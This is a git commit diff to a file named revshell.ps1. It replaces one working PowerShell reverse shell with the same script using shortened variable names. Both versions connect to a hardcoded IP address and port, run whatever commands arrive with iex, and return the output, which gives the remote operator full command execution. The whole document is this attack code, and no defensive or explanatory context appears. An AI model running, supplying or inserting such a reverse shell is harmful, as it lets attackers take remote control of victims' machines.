a5b05c0fc55b730b23cd947055cb9ee784edaec9
josh-fraser <53281424+josh-fraser@users.noreply.github.com>
2022-06-18 12:01:26 +1000

    Update revshell.ps1

--- revshell.ps1
+++ revshell.ps1
@@ -1,12 +1,12 @@
-$client = New-Object System.Net.Sockets.TCPClient("120.156.138.160",5674)
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-  $sendback = (iex $data 2>&1 | Out-String )
-  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-  $stream.Write($sendbyte,0,$sendbyte.Length)
-  $stream.Flush()
-}
-$client.Close()
+$c = New-Object System.Net.Sockets.TCPClient("120.156.138.160",5674)
+$s = $c.GetStream()
+[byte[]]$b = 0..65535|%{0}
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i)
+    $sb1 = (iex $d 2>&1 | Out-String )
+    $sb2 = $sb1 + "PS " + (pwd).Path + "> "
+    $sb = ([text.encoding]::ASCII).GetBytes($sb2)
+    $s.Write($sb,0,$sb.Length)
+    $s.Flush()
+    }
+$c.Close()
